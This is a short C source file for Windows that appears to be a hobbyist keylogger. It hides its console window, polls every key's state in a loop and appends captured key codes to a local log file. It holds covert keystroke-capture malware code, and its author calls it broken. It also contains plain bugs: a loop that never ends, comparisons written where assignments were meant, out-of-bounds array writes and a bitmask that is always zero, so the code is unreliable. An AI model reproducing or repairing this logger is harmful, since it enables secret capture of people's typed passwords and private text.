// Obviously doesn't work, yet, or maybe ever.

/*
    Debug Log so I don't go insane trying to make this work:
    SaveInt - Save key input states in a log file (broken)
    Save - Save key input in a log file (broken)
    Probable cause of everything being broken: Checking the wrong keycode.
*/

#include <windows.h>
#include <stdio.h>

int Save(int _key, char *file);
int SaveInt(int number, char *file);

int main(void){
    FreeConsole();
    while (1 == 1){
        Sleep(10);
        for (char i = 8; i < 255; i++){
            if ((GetAsyncKeyState(i) & 0x8000) && (i == 0x41)){
                Save(i, "log.txt");
            }
        }
    }
    return 0;
}

int Save(int _key, char *file){
    Sleep(10);
    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");
    fprintf(OUTPUT_FILE, "START\n");
    
    int activeKey = 1;
    int pressedChars[254];

    for(int iteration = 0; iteration < sizeof(pressedChars); iteration++){
        pressedChars[iteration] = 0;
    }

    while (activeKey == 1){
        Sleep(10);
        for (char i = 8; i < 255; i++){
            if ((GetAsyncKeyState(i) & 0x8000) && (i == 0x42)){
                activeKey = 0;
                fprintf(OUTPUT_FILE, "END");
                fclose(OUTPUT_FILE);
                break;
            }
            if ((GetAsyncKeyState(i) & 0x8000 & (pressedChars[i-8] == 0))){
                pressedChars[i-8] == 1;
            }
            if (((GetAsyncKeyState(i) & 0x0000) & (pressedChars[i-8] == 1))){
                pressedChars[i-8] == 0;
                fprintf(OUTPUT_FILE, "%s,%d\n", &i,i);
            }
        }
    }
    return 0;
}

int SaveInt(int number, char *file){
    Sleep(10);
    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");
    fprintf(OUTPUT_FILE, "%d,\n", number);
    fclose(OUTPUT_FILE);
    return 0;
}

